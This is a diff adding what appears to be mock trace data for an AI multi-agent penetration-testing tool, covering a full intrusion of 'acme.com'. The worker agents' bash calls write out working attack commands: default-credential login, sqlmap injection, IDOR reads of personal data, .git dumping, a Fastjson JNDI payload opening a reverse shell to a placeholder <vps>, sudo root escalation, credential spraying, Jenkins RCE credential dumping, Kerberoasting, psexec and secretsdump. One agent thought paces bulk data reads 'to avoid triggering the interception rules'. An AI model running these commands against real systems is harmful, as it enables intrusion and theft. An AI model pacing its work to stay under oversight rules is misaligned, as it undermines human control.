+    ts: T("2026-07-24T09:27:01Z"),
+    kind: "tool_result",
+    tool: "upsert_asset",
+    tool_use_id: "t13",
+    summary: "6 assets upserted",
+  },
+  {
+    seq: 17,
+    worker: "work#1",
+    intent_id: "i1",
+    ts: T("2026-07-24T09:40:00Z"),
+    kind: "result",
+    summary:
+      "Completed asset reconnaissance, discovered the back office admin.acme.com, and returned the results to the graph.",
+    input_tokens: 96000,
+    output_tokens: 6100,
+    cache_read_tokens: 61000,
+    cache_write_tokens: 9000,
+  },
+
+  // work#2 · i2 后台默认口令（done，证明 g1）
+  {
+    seq: 20,
+    worker: "work#2",
+    intent_id: "i2",
+    ts: T("2026-07-26T03:31:00Z"),
+    kind: "thinking",
+    summary:
+      "The back office is Element-UI, and the login endpoint has neither a CAPTCHA nor rate limiting. Try the default password list first, then move on to dictionary attacks.",
+  },
+  {
+    seq: 21,
+    worker: "work#2",
+    intent_id: "i2",
+    ts: T("2026-07-26T03:32:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t21",
+    summary: "curl -s -d 'username=admin&password=admin' https://admin.acme.com/login -o /dev/null -w '%{http_code}'",
+  },
+  {
+    seq: 22,
+    worker: "work#2",
+    intent_id: "i2",
+    ts: T("2026-07-26T03:32:03Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t21",
+    summary: "401",
+    detail: "admin/admin failed.",
+  },
+  {
+    seq: 23,
+    worker: "work#2",
+    intent_id: "i2",
+    ts: T("2026-07-26T03:32:30Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t22",
+    summary: "curl -si -d 'username=admin&password=admin123' https://admin.acme.com/login",
+  },
+  {
+    seq: 24,
+    worker: "work#2",
+    intent_id: "i2",
+    ts: T("2026-07-26T03:32:33Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t22",
+    summary: "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ…; HttpOnly\nLocation: /dashboard",
+    detail: "admin/admin123 logged in successfully, obtained a session cookie.",
+  },
+  {
+    seq: 25,
+    worker: "work#2",
+    intent_id: "i2",
+    ts: T("2026-07-26T03:33:10Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t23",
+    summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/dashboard | grep -o '<title>[^<]*'",
+  },
+  {
+    seq: 26,
+    worker: "work#2",
+    intent_id: "i2",
+    ts: T("2026-07-26T03:33:12Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t23",
+    summary: "<title>Acme Admin · Console",
+    detail: "Confirmed entry into the back-office console.",
+  },
+  {
+    seq: 27,
+    worker: "work#2",
+    intent_id: "i2",
+    ts: T("2026-07-26T03:34:00Z"),
+    kind: "tool_use",
+    tool: "report_finding",
+    tool_use_id: "t24",
+    summary: "report_finding(Default Credentials, high)",
+  },
+  {
+    seq: 28,
+    worker: "work#2",
+    intent_id: "i2",
+    ts: T("2026-07-26T03:34:01Z"),
+    kind: "tool_result",
+    tool: "report_finding",
+    tool_use_id: "t24",
+    summary: "Recorded finding f-6 and linked it to goal g1 (proves).",
+  },
+  {
+    seq: 29,
+    worker: "work#2",
+    intent_id: "i2",
+    ts: T("2026-07-26T03:50:00Z"),
+    kind: "result",
+    summary: "Confirmed the back-office default password and achieved goal (1).",
+    input_tokens: 72000,
+    output_tokens: 4800,
+    cache_read_tokens: 48000,
+    cache_write_tokens: 7200,
+  },
+
+  // work#4 · i4 SQL 注入（done）
+  {
+    seq: 40,
+    worker: "work#4",
+    intent_id: "i4",
+    ts: T("2026-07-25T22:01:00Z"),
+    kind: "thinking",
+    summary:
+      "The search?q= results page appends q to the title. First manually insert a single quote to check for an error message.",
+  },
+  {
+    seq: 41,
+    worker: "work#4",
+    intent_id: "i4",
+    ts: T("2026-07-25T22:02:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t41",
+    summary: "curl -s \"https://www.acme.com/search?q=1'\" | grep -i 'sql\\|syntax'",
+  },
+  {
+    seq: 42,
+    worker: "work#4",
+    intent_id: "i4",
+    ts: T("2026-07-25T22:02:04Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t41",
+    summary: "Unclosed quotation mark ... near '1'.",
+    detail: "This is a sign of MSSQL error-based injection.",
+  },
+  {
+    seq: 43,
+    worker: "work#4",
+    intent_id: "i4",
+    ts: T("2026-07-25T22:03:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t42",
+    summary: "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs --level 2",
+  },
+  {
+    seq: 44,
+    worker: "work#4",
+    intent_id: "i4",
+    ts: T("2026-07-26T01:18:00Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t42",
+    summary:
+      "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb",
+    detail: "Confirmed the injection is exploitable and enumerated 4 databases.",
+  },
+  {
+    seq: 45,
+    worker: "work#4",
+    intent_id: "i4",
+    ts: T("2026-07-26T01:19:00Z"),
+    kind: "tool_use",
+    tool: "report_finding",
+    tool_use_id: "t43",
+    summary: "report_finding(SQL Injection, high)",
+  },
+  {
+    seq: 46,
+    worker: "work#4",
+    intent_id: "i4",
+    ts: T("2026-07-26T01:19:01Z"),
+    kind: "tool_result",
+    tool: "report_finding",
+    tool_use_id: "t43",
+    summary: "Recorded finding f-1.",
+  },
+  {
+    seq: 47,
+    worker: "work#4",
+    intent_id: "i4",
+    ts: T("2026-07-26T01:20:00Z"),
+    kind: "result",
+    summary: "Confirmed the SQL injection.",
+    input_tokens: 118000,
+    output_tokens: 7400,
+    cache_read_tokens: 82000,
+    cache_write_tokens: 11000,
+  },
+
+  // work#5 · i5 IDOR（running）
+  {
+    seq: 50,
+    worker: "work#5",
+    intent_id: "i5",
+    ts: T("2026-07-26T02:31:00Z"),
+    kind: "thinking",
+    summary:
+      "/v1/orders?id= uses an auto-incrementing numeric id, a classic IDOR surface. First query my own order, then change the id to check whether other users' orders can be read.",
+  },
+  {
+    seq: 51,
+    worker: "work#5",
+    intent_id: "i5",
+    ts: T("2026-07-26T02:40:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t51",
+    summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1001",
+  },
+  {
+    seq: 52,
+    worker: "work#5",
+    intent_id: "i5",
+    ts: T("2026-07-26T02:40:02Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t51",
+    summary: '{ "order_id":1001, "user_id":42, "amount":299 }',
+    detail: "This is my own order, as expected.",
+  },
+  {
+    seq: 53,
+    worker: "work#5",
+    intent_id: "i5",
+    ts: T("2026-07-26T02:43:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t52",
+    summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1002",
+  },
+  {
+    seq: 54,
+    worker: "work#5",
+    intent_id: "i5",
+    ts: T("2026-07-26T02:43:02Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t52",
+    summary:
+      '{ "order_id":1002, "user_id":77, "amount":1299, "phone":"138****6021", "address":"Gangnam-gu, Seoul ****" }',
+    detail:
+      "Read another user's order (including phone number/address) via authorization bypass; there is no ownership check.",
+  },
+  {
+    seq: 55,
+    worker: "work#5",
+    intent_id: "i5",
+    ts: T("2026-07-26T02:44:00Z"),
+    kind: "tool_use",
+    tool: "report_finding",
+    tool_use_id: "t53",
+    summary: "report_finding(IDOR, high)",
+  },
+  {
+    seq: 56,
+    worker: "work#5",
+    intent_id: "i5",
+    ts: T("2026-07-26T02:44:01Z"),
+    kind: "tool_result",
+    tool: "report_finding",
+    tool_use_id: "t53",
+    summary: "Recorded finding f-2.",
+  },
+  {
+    seq: 57,
+    worker: "work#5",
+    intent_id: "i5",
+    ts: T("2026-07-26T03:58:10Z"),
+    kind: "thinking",
+    summary:
+      "Iterating across the id range in bulk to assess the scale of data accessible via the authorization bypass (not exporting yet, to avoid triggering the interception rules).",
+  },
+
+  // work#3 · i3 后台用户接口枚举（running）
+  {
+    seq: 60,
+    worker: "work#3",
+    intent_id: "i3",
+    ts: T("2026-07-26T03:56:00Z"),
+    kind: "thinking",
+    summary:
+      "Already have a back-office session; enumerating admin endpoints to find an entry point for bulk-exporting sensitive user data (goal 2).",
+  },
+  {
+    seq: 61,
+    worker: "work#3",
+    intent_id: "i3",
+    ts: T("2026-07-26T03:57:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t61",
+    summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/api/users?page=1",
+  },
+  {
+    seq: 62,
+    worker: "work#3",
+    intent_id: "i3",
+    ts: T("2026-07-26T03:57:02Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t61",
+    summary: '{ "total": 12840, "items": [ { "id":1, "email":"a***@acme.com", "phone":"139****" } ] }',
+    detail:
+      "The admin endpoint can return all users page by page (including email/phone number), roughly 12,800 records.",
+  },
+  {
+    seq: 63,
+    worker: "work#3",
+    intent_id: "i3",
+    ts: T("2026-07-26T03:58:20Z"),
+    kind: "thinking",
+    summary:
+      "Confirmed an entry point exists for bulk-reading user data. The export action trips the destructive/exfiltration rules, so an interception approval has been submitted and is awaiting approval.",
+  },
+
+  // workG · ig .git 源码泄露与硬编码凭据（done）
+  {
+    seq: 310,
+    worker: "workG",
+    intent_id: "ig",
+    ts: T("2026-07-25T20:26:00Z"),
+    kind: "thinking",
+    summary:
+      "robots.txt mentions /.git. First check whether the directory can be downloaded; if the source code can be obtained, injection points and hardcoded secrets can be found via white-box analysis.",
+  },
+  {
+    seq: 311,
+    worker: "workG",
+    intent_id: "ig",
+    ts: T("2026-07-25T20:27:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "tg1",
+    summary: "curl -s -o /dev/null -w '%{http_code}' https://www.acme.com/.git/HEAD",
+  },
+  {
+    seq: 312,
+    worker: "workG",
+    intent_id: "ig",
+    ts: T("2026-07-25T20:27:02Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "tg1",
+    summary: "200",
+    detail: "The .git directory is externally accessible.",
+  },
+  {
+    seq: 313,
+    worker: "workG",
+    intent_id: "ig",
+    ts: T("2026-07-25T20:28:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "tg2",
+    summary: "git-dumper https://www.acme.com/.git/ /tmp/acme && git -C /tmp/acme log --oneline | head",
+  },
+  {
+    seq: 314,
+    worker: "workG",
+    intent_id: "ig",
+    ts: T("2026-07-25T20:30:00Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "tg2",
+    summary: "Recovered 214 files; HEAD=main. config.php / db.php are in the listing.",
+    detail: "Recovered the entire backend source code into /tmp/acme.",
+  },
+  {
+    seq: 315,
+    worker: "workG",
+    intent_id: "ig",
+    ts: T("2026-07-25T20:34:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "tg3",
+    summary: "grep -rniE 'password|pwd|secret|Data Source' /tmp/acme/config.php",
+  },
+  {
+    seq: 316,
+    worker: "workG",
+    intent_id: "ig",
+    ts: T("2026-07-25T20:34:03Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "tg3",
+    summary: "$db_user='sa'; $db_pass='Acme@2021'; $db_host='10.10.10.30';",
+    detail:
+      "The database password is hardcoded, and the host points to an internal IP. Recording this as a credential suspected to be shared across the internal network.",
+  },
+  {
+    seq: 317,
+    worker: "workG",
+    intent_id: "ig",
+    ts: T("2026-07-25T20:36:00Z"),
+    kind: "result",
+    summary:
+      "Confirmed the source code leak and the hardcoded DB credentials, and recorded the credential in the graph so it can be reused on the internal network later.",
+    input_tokens: 88000,
+    output_tokens: 5200,
+    cache_read_tokens: 60000,
+    cache_write_tokens: 8000,
+  },
+
+  // work#6 · i6 shop 指纹与 CVE 关联（done）
+  {
+    seq: 320,
+    worker: "work#6",
+    intent_id: "i6",
+    ts: T("2026-07-25T14:22:00Z"),
+    kind: "thinking",
+    summary:
+      "Since shop.acme.com is an in-house e-commerce build, first fingerprint the framework/component versions, then target any component with a known deserialization vulnerability.",
+  },
+  {
+    seq: 321,
+    worker: "work#6",
+    intent_id: "i6",
+    ts: T("2026-07-25T14:24:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t6a",
+    summary: "curl -si https://shop.acme.com/ | grep -iE 'x-powered-by|server|jsessionid'",
+  },
+  {
+    seq: 322,
+    worker: "work#6",
+    intent_id: "i6",
+    ts: T("2026-07-25T14:24:03Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t6a",
+    summary: "X-Powered-By: Servlet\nSet-Cookie: JSESSIONID=...",
+    detail: "This is a Java tech stack, and there is an /api/import endpoint that accepts a JSON body.",
+  },
+  {
+    seq: 323,
+    worker: "work#6",
+    intent_id: "i6",
+    ts: T("2026-07-25T14:30:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t6b",
+    summary:
+      'curl -s -H \'Content-Type: application/json\' -d \'{"a":{"@type":"java.lang.AutoCloseable"}}\' https://shop.acme.com/api/import',
+  },
+  {
+    seq: 324,
+    worker: "work#6",
+    intent_id: "i6",
+    ts: T("2026-07-25T14:31:00Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t6b",
+    summary: "The error stack includes com.alibaba.fastjson.JSONException (1.2.24)",
+    detail: "Confirmed Fastjson 1.2.24, which corresponds to the JdbcRowSetImpl JNDI injection RCE.",
+  },
+  {
+    seq: 325,
+    worker: "work#6",
+    intent_id: "i6",
+    ts: T("2026-07-25T14:40:00Z"),
+    kind: "result",
+    summary:
+      "The fingerprint matched Fastjson 1.2.24, establishing a deserialization RCE attack surface; handing off to the exploitation intent.",
+    input_tokens: 64000,
+    output_tokens: 4100,
+    cache_read_tokens: 42000,
+    cache_write_tokens: 6000,
+  },
+
+  // work#7 · i7 反序列化 RCE 拿反弹 shell（done，证明 g3）
+  {
+    seq: 330,
+    worker: "work#7",
+    intent_id: "i7",
+    ts: T("2026-07-25T15:12:00Z"),
+    kind: "thinking",
+    summary:
+      "Stand up a malicious JNDI/LDAP service so shop connects back to load and execute the payload; first confirm outbound communication via dnslog, then obtain a reverse shell.",
+  },
+  {
+    seq: 331,
+    worker: "work#7",
+    intent_id: "i7",
+    ts: T("2026-07-25T15:15:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t7a",
+    summary: "java -jar JNDIExploit.jar -i <vps> -l 1389 &  # start the malicious LDAP/HTTP service",
+  },
+  {
+    seq: 332,
+    worker: "work#7",
+    intent_id: "i7",
+    ts: T("2026-07-25T15:16:00Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t7a",
+    summary: "LDAP Server started on 1389, HTTP on 8180",
+    detail: "The malicious service is ready.",
+  },
+  {
+    seq: 333,
+    worker: "work#7",
+    intent_id: "i7",
+    ts: T("2026-07-25T15:20:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t7b",
+    summary:
+      'curl -s -H \'Content-Type: application/json\' -d \'{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<vps>:1389/Basic/ReverseShell/<vps>/4444","autoCommit":true}\' https://shop.acme.com/api/import',
+  },
+  {
+    seq: 334,
+    worker: "work#7",
+    intent_id: "i7",
+    ts: T("2026-07-25T15:21:00Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t7b",
+    summary: "LDAP received the request → ReverseShell loaded → nc listener received the connection",
+    detail: "The payload was triggered successfully.",
+  },
+  {
+    seq: 335,
+    worker: "work#7",
+    intent_id: "i7",
+    ts: T("2026-07-25T15:24:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t7c",
+    summary: "id; hostname -I  # check identity and network ranges inside the reverse shell",
+  },
+  {
+    seq: 336,
+    worker: "work#7",
+    intent_id: "i7",
+    ts: T("2026-07-25T15:24:02Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t7c",
+    summary: "uid=33(www-data) gid=33 groups=33\n10.0.20.15 10.10.10.15",
+    detail:
+      "This is www-data@dmz-web01, and the second network card is on 10.10.10.x. Landed in the DMZ, adjacent to the internal network.",
+  },
+  {
+    seq: 337,
+    worker: "work#7",
+    intent_id: "i7",
+    ts: T("2026-07-25T15:30:00Z"),
+    kind: "tool_use",
+    tool: "report_finding",
+    tool_use_id: "t7d",
+    summary: "report_finding(Deserialization RCE, high)",
+  },
+  {
+    seq: 338,
+    worker: "work#7",
+    intent_id: "i7",
+    ts: T("2026-07-25T15:40:00Z"),
+    kind: "result",
+    summary:
+      "Obtained a www-data reverse shell via deserialization RCE, establishing an initial foothold for goal (3).",
+    input_tokens: 132000,
+    output_tokens: 8600,
+    cache_read_tokens: 90000,
+    cache_write_tokens: 12000,
+  },
+
+  // work#8 · i8 立足点提权（done）
+  {
+    seq: 340,
+    worker: "work#8",
+    intent_id: "i8",
+    ts: T("2026-07-25T16:02:00Z"),
+    kind: "thinking",
+    summary:
+      "Since www-data has limited privileges, first look for privilege-escalation vectors via local enumeration: sudo configuration, SUID binaries, kernel version.",
+  },
+  {
+    seq: 341,
+    worker: "work#8",
+    intent_id: "i8",
+    ts: T("2026-07-25T16:05:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t8a",
+    summary: "sudo -n -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head",
+  },
+  {
+    seq: 342,
+    worker: "work#8",
+    intent_id: "i8",
+    ts: T("2026-07-25T16:05:03Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t8a",
+    summary: "User www-data may run: (ALL) NOPASSWD: /usr/bin/python3",
+    detail:
+      "python3 is on the sudo whitelist and is also password-exempt. Privilege escalation is possible immediately.",
+  },
+  {
+    seq: 343,
+    worker: "work#8",
+    intent_id: "i8",
+    ts: T("2026-07-25T16:10:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t8b",
+    summary: "sudo python3 -c 'import os;os.setuid(0);os.system(\"id\")'",
+  },
+  {
+    seq: 344,
+    worker: "work#8",
+    intent_id: "i8",
+    ts: T("2026-07-25T16:10:02Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t8b",
+    summary: "uid=0(root) gid=0(root) groups=0(root)",
+    detail: "Escalated privileges to root.",
+  },
+  {
+    seq: 345,
+    worker: "work#8",
+    intent_id: "i8",
+    ts: T("2026-07-25T16:14:00Z"),
+    kind: "tool_use",
+    tool: "report_finding",
+    tool_use_id: "t8c",
+    summary: "report_finding(Privilege Escalation, high)",
+  },
+  {
+    seq: 346,
+    worker: "work#8",
+    intent_id: "i8",
+    ts: T("2026-07-25T16:20:00Z"),
+    kind: "result",
+    summary:
+      "Completed local privilege escalation to root, consolidating the foothold; preparing to pivot through it against the internal network.",
+    input_tokens: 74000,
+    output_tokens: 4700,
+    cache_read_tokens: 50000,
+    cache_write_tokens: 7000,
+  },
+
+  // work#9 · i9 内网主机发现（done）
+  {
+    seq: 350,
+    worker: "work#9",
+    intent_id: "i9",
+    ts: T("2026-07-25T20:32:00Z"),
+    kind: "thinking",
+    summary:
+      "Since the foothold connects directly to 10.10.10.0/24, use fscan/internal network scanning to discover hosts and ports and pinpoint the domain controller and other high-value hosts.",
+  },
+  {
+    seq: 351,
+    worker: "work#9",
+    intent_id: "i9",
+    ts: T("2026-07-25T20:36:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t9a",
+    summary: "./fscan -h 10.10.10.0/24 -np -nobr 2>&1 | tail -n 30",
+  },
+  {
+    seq: 352,
+    worker: "work#9",
+    intent_id: "i9",
+    ts: T("2026-07-25T20:55:00Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t9a",
+    summary: "DC01(10.10.10.10) 88/389/445\nFS01(10.10.10.5) 445\nJENKINS(10.10.10.20) 8080",
+    detail: "Pinpointed domain controller DC01, file server FS01, and internal Jenkins.",
+  },
+  {
+    seq: 353,
+    worker: "work#9",
+    intent_id: "i9",
+    ts: T("2026-07-25T21:00:00Z"),
+    kind: "result",
+    summary: "Completed internal network host discovery and recorded 3 high-value targets in the graph.",
+    input_tokens: 82000,
+    output_tokens: 5100,
+    cache_read_tokens: 56000,
+    cache_write_tokens: 8000,
+  },
+
+  // work#10 · i10 内网凭据复用（running）
+  {
+    seq: 360,
+    worker: "work#10",
+    intent_id: "i10",
+    ts: T("2026-07-26T03:42:00Z"),
+    kind: "thinking",
+    summary:
+      "sa/Acme@2021 obtained from the source code leak is a DB password, but password reuse is common in enterprises. Performing a password spray against DC01/FS01/JENKINS.",
+  },
+  {
+    seq: 361,
+    worker: "work#10",
+    intent_id: "i10",
+    ts: T("2026-07-26T03:44:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t10a",
+    summary: "crackmapexec smb 10.10.10.5 10.10.10.10 -u sa -p 'Acme@2021'",
+  },
+  {
+    seq: 362,
+    worker: "work#10",
+    intent_id: "i10",
+    ts: T("2026-07-26T03:44:10Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t10a",
+    summary: "FS01 [+] acme.local\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] authentication failed",
+    detail: "Password reuse of sa succeeded on FS01, with admin rights. DC01 did not connect.",
+  },
+  {
+    seq: 363,
+    worker: "work#10",
+    intent_id: "i10",
+    ts: T("2026-07-26T03:50:00Z"),
+    kind: "thinking",
+    summary: "Compromised FS01 and is enumerating shared directories to find more credentials and sensitive files…",
+  },
+
+  // work#11 · i11 Jenkins 未授权 RCE（done）
+  {
+    seq: 370,
+    worker: "work#11",
+    intent_id: "i11",
+    ts: T("2026-07-25T21:32:00Z"),
+    kind: "thinking",
+    summary: "JENKINS 8080 is directly reachable; first check whether the /script console requires authentication.",
+  },
+  {
+    seq: 371,
+    worker: "work#11",
+    intent_id: "i11",
+    ts: T("2026-07-25T21:35:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t11a",
+    summary: "curl -s http://10.10.10.20:8080/script -o /dev/null -w '%{http_code}'",
+  },
+  {
+    seq: 372,
+    worker: "work#11",
+    intent_id: "i11",
+    ts: T("2026-07-25T21:35:02Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t11a",
+    summary: "200",
+    detail: "The Script Console is accessible without logging in.",
+  },
+  {
+    seq: 373,
+    worker: "work#11",
+    intent_id: "i11",
+    ts: T("2026-07-25T21:40:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t11b",
+    summary: "curl -s -d 'script=println+\"whoami\".execute().text' http://10.10.10.20:8080/scriptText",
+  },
+  {
+    seq: 374,
+    worker: "work#11",
+    intent_id: "i11",
+    ts: T("2026-07-25T21:40:03Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t11b",
+    summary: "nt authority\\system",
+    detail: "Groovy runs with SYSTEM privileges.",
+  },
+  {
+    seq: 375,
+    worker: "work#11",
+    intent_id: "i11",
+    ts: T("2026-07-25T21:44:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t11c",
+    summary: "curl -s -d 'script=...' http://10.10.10.20:8080/scriptText  # dump the Jenkins credential store",
+  },
+  {
+    seq: 376,
+    worker: "work#11",
+    intent_id: "i11",
+    ts: T("2026-07-25T21:45:00Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t11c",
+    summary: "acme\\svc_deploy : Deploy@Acme2024\nacme\\svc_build : Build#2023!",
+    detail: "Dumped the plaintext passwords of two domain service accounts.",
+  },
+  {
+    seq: 377,
+    worker: "work#11",
+    intent_id: "i11",
+    ts: T("2026-07-25T21:48:00Z"),
+    kind: "tool_use",
+    tool: "report_finding",
+    tool_use_id: "t11d",
+    summary: "report_finding(Unauthenticated RCE, high)",
+  },
+  {
+    seq: 378,
+    worker: "work#11",
+    intent_id: "i11",
+    ts: T("2026-07-25T21:50:00Z"),
+    kind: "result",
+    summary: "Confirmed Jenkins unauthenticated RCE and dumped credentials for two domain service accounts.",
+    input_tokens: 96000,
+    output_tokens: 6200,
+    cache_read_tokens: 64000,
+    cache_write_tokens: 9500,
+  },
+
+  // work#12 · i12 Kerberoasting（done）
+  {
+    seq: 380,
+    worker: "work#12",
+    intent_id: "i12",
+    ts: T("2026-07-25T22:42:00Z"),
+    kind: "thinking",
+    summary:
+      "Authenticating to the domain with the svc_deploy credential, then requesting the TGS of a Kerberoastable service account via GetUserSPNs.",
+  },
+  {
+    seq: 381,
+    worker: "work#12",
+    intent_id: "i12",
+    ts: T("2026-07-25T22:50:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t12a",
+    summary: "impacket-GetUserSPNs acme.local/svc_deploy:'Deploy@Acme2024' -dc-ip 10.10.10.10 -request",
+  },
+  {
+    seq: 382,
+    worker: "work#12",
+    intent_id: "i12",
+    ts: T("2026-07-25T22:52:00Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t12a",
+    summary: "svc_sql  MSSQLSvc/db01.acme.local:1433  $krb5tgs$23$*svc_sql$...",
+    detail: "Obtained svc_sql's TGS ticket (Kerberos RC4).",
+  },
+  {
+    seq: 383,
+    worker: "work#12",
+    intent_id: "i12",
+    ts: T("2026-07-25T23:10:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t12b",
+    summary: "hashcat -m 13100 tgs.hash rockyou.txt --force",
+  },
+  {
+    seq: 384,
+    worker: "work#12",
+    intent_id: "i12",
+    ts: T("2026-07-25T23:18:00Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t12b",
+    summary: "$krb5tgs$23$*svc_sql$...:Sql@2020",
+    detail: "Cracked the password Sql@2020 in 8 minutes.",
+  },
+  {
+    seq: 385,
+    worker: "work#12",
+    intent_id: "i12",
+    ts: T("2026-07-25T23:19:00Z"),
+    kind: "tool_use",
+    tool: "report_finding",
+    tool_use_id: "t12c",
+    summary: "report_finding(Kerberoasting, high)",
+  },
+  {
+    seq: 386,
+    worker: "work#12",
+    intent_id: "i12",
+    ts: T("2026-07-25T23:20:00Z"),
+    kind: "result",
+    summary:
+      "Cracked svc_sql's password via Kerberoasting and recorded it in the graph for use against the domain controller.",
+    input_tokens: 108000,
+    output_tokens: 6800,
+    cache_read_tokens: 72000,
+    cache_write_tokens: 10000,
+  },
+
+  // work#13 · i13 拿下域控 DC01（done，证明 g4）
+  {
+    seq: 390,
+    worker: "work#13",
+    intent_id: "i13",
+    ts: T("2026-07-25T23:52:00Z"),
+    kind: "thinking",
+    summary:
+      "Since svc_deploy came from the Jenkins credential store, first check its group membership. If it belongs to Domain Admins, psexec to DC01 can happen immediately.",
+  },
+  {
+    seq: 391,
+    worker: "work#13",
+    intent_id: "i13",
+    ts: T("2026-07-25T23:55:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t13a",
+    summary: "net rpc group members 'Domain Admins' -U 'acme.local/svc_deploy%Deploy@Acme2024' -S 10.10.10.10",
+  },
+  {
+    seq: 392,
+    worker: "work#13",
+    intent_id: "i13",
+    ts: T("2026-07-25T23:55:05Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t13a",
+    summary: "ACME\\Administrator\nACME\\svc_deploy",
+    detail: "svc_deploy is a member of Domain Admins.",
+  },
+  {
+    seq: 393,
+    worker: "work#13",
+    intent_id: "i13",
+    ts: T("2026-07-26T00:00:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t13b",
+    summary: "impacket-psexec acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10",
+  },
+  {
+    seq: 394,
+    worker: "work#13",
+    intent_id: "i13",
+    ts: T("2026-07-26T00:00:10Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t13b",
+    summary: "C:\\Windows\\system32> whoami\nnt authority\\system",
+    detail: "Logged into domain controller DC01 with SYSTEM privileges.",
+  },
+  {
+    seq: 395,
+    worker: "work#13",
+    intent_id: "i13",
+    ts: T("2026-07-26T00:05:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t13c",
+    summary: "impacket-secretsdump acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10 -just-dc",
+  },
+  {
+    seq: 396,
+    worker: "work#13",
+    intent_id: "i13",
+    ts: T("2026-07-26T00:10:00Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t13c",
+    summary: "Administrator:500:aad3b435...:::  krbtgt:502:aad3b435...:::",
+    detail:
+      "Dumped the entire domain's NTLM hashes (including krbtgt), enabling a golden ticket for persistent control.",
+  },
+  {
+    seq: 397,
+    worker: "work#13",
+    intent_id: "i13",
+    ts: T("2026-07-26T00:15:00Z"),
+    kind: "tool_use",
+    tool: "report_finding",
+    tool_use_id: "t13d",
+    summary: "report_finding(Domain Compromise, high)",
+  },
+  {
+    seq: 398,
+    worker: "work#13",
+    intent_id: "i13",
+    ts: T("2026-07-26T00:20:00Z"),
+    kind: "result",
+    summary:
+      "Compromised domain controller DC01 and dumped the entire domain's hashes with secretsdump, achieving the objective.",
+    input_tokens: 144000,
+    output_tokens: 9200,
+    cache_read_tokens: 96000,
+    cache_write_tokens: 14000,
+  },
+
+  // 主 agent（人在环路对话）
+  {
+    seq: 70,
+    worker: "mainagent",
+    ts: T("2026-07-26T03:18:00Z"),
+    kind: "user",
+    summary: "Where should we start attacking the back office?",
+  },
+  {
